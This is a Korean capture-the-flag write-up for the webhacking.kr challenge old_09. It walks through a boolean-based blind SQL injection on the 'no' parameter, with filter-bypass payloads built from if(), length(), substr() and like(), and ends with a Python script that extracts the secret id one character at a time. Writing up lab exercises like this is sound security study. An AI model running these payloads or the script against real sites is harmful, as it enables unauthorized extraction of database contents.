## old_09

![vmware_36cSFiuMJ6](https://user-images.githubusercontent.com/79683414/144971973-2d9a77fa-1096-4dc7-9789-443b4e944420.png)

1,2,3 링크가 있고 Password 를 제출하는 Input form 이 있다.

정보를 좀 더 필요하다.

<br>

_1을 클릭했을 때_

![vmware_zJGWY4rcqQ](https://user-images.githubusercontent.com/79683414/144972381-b4068dbb-16d7-4c99-bbe4-7a194c6a69c3.png)

<br>

_2를 클릭했을 때_

![rCXTKyheNa](https://user-images.githubusercontent.com/79683414/144972460-269919ae-1725-4a43-85a4-a64085ed0bf9.png)

<br>

_3을 클릭했을 때_

![bPiPunRWw1](https://user-images.githubusercontent.com/79683414/144972509-7829e425-e55c-488a-820b-b345ecd13746.png)

<br>

_password 입력 시_

![awEp8lo0ve](https://user-images.githubusercontent.com/79683414/144972552-0fb77942-9dec-4cc0-90b1-5420a7d458fa.png)

<br>

모든 Request 가 GET 을 통해 요청된다.

1,2,3을 클릭하면 그 값이 no 에 세팅되고 GET을 통해 전달된다.

3번의 힌트를 보아하니 SQL 인젝션 문제가 확실한 듯 한데,

Password 에 인젝션이 가능한지 테스트 해봤지만 아무런 반응이 없었다.

<br>

no 에 인젝션이 가능한지 Burp Suite 를 이용해 테스트 했다. 

인젝션을 테스트 할 땐, Burp suite 의 Repeater 기능이 유용하다.

`'or 1=1 #` 을 urlencode 후 입력해주었다.

![vmware_qkSoEjnCbD](https://user-images.githubusercontent.com/79683414/144974101-23fdc1e0-faef-4df1-9a25-132986d0af46.png)

<br>

여러가지 인젝션 값들을 시도해봤는데 `공백문자, ", ', +  `  등의 필터링이 적용되어 있다.

Boolean Base 인젝션이 가능할 것 같다.

여기서, 쿼리를 예상해보면 아래와 같다.

<br>

__select id from chall9 where no="$_GET['go']"__

<br>

최종적으로는 `no=3` 인 id 를 찾아야 한다.

우선 Secret 의 길이부터 알아내보자. 필터링을 우회하기 위해 사용할 것들이다.

- if(조건문, 참일 때 반환값, 거짓일 때 반환값)
- length(string) : 길이를 반환
- substr(str, start_index, offset) : 문자열에서 문자(열) 추출
- like() : 조건

<br>

no=1 인 경우를 테스트 해보겠다.

`no=if(조건, 1, 0)` 일 때 결과 값을 이용하여 인젝션을 수행할 수 있다.

<br>

Boolean 인젝션을 위한 쿼리는 아래와 같다.

__select ... no=if(length(id)like(4), 1,0))__

<br>

그런데,

위의 쿼리는 like 의 사용법이 살짝 독특하다.

지금 까지 사용한 like 는,

__select ... where id like "%pple"__

<br>

if(length(id)like(4),1,0)) 은 length(id)like(4)가 참이면 1을 반환할 것 같지만, 결과적으로,

id 의 길이가 4 이고, no=1 을 만족하는 id 값을 반환한다. 결과를 확인해 보기 위해 테스트해봤다.

![vmware_nptsZLsKnT](https://user-images.githubusercontent.com/79683414/144976712-aeb7218b-86f4-4691-b756-2424e51733cd.png)

![vmware_9TL97ABMaZ](https://user-images.githubusercontent.com/79683414/144980156-507ed988-bb98-43cc-b045-7e46ad3b278e.png)

두 번째 사진에서, length(id)like(5) 인 "Apple" 이 존재 하므로 참 값인 "2"를 반환하여 Banana 를 출력할 것 같지만 아무것도 출력되지 않는다.

두 조건 모두 만족해야 하기 때문이다.

<br> 이를 이용해서 ID 의 길이 값을 알아보자.

__no=if(length(id)like(1), 3, 0))__

이렇게 하면 no=3 인 ID의 길이가 참일 때 no=3 에서 출력되었던 결과가 출력될 것이다.

<br>

길이를 알아낸 후

__no=if(substr(id,1,1)like("a"), 3,0))__

을 이용하여 1자리씩 id 값을 알아낼 수 있다.

<br>

번거로우니 파이썬을 이용했다.

```python
import urllib.request, re, string


def get_response(query):
    url = "https://webhacking.kr/challenge/web-09/index.php?no={}".format(query)
    res = urllib.request.urlopen(url)
    read = str(res.read().decode("utf-8"))
    if re.search("Secret", read):
        return True


def find_length():
    for i in range(1, 20):
        query = "if(length(id)like({}),3,0)".format(i)
        if get_response(query):
            print("len: ", i)
            return i


def find_id(length):
    result = ""
    for i in range(1, length+1):
        for e in string.ascii_letters:
            query = "if(substr(id,{},1)like('{}'),3,0)".format(i, e)
            print(query)
            if get_response(query):
                result += e
                break
    return result


if __name__ == "__main__":
    id_len = find_length()
    flag = find_id(id_len)
    print("ID : ", flag)
```

![pycharm64_lO0LabZU3z](https://user-images.githubusercontent.com/79683414/144980892-2f3e7a1b-0fd3-457a-9a50-706e94cecb4a.png)
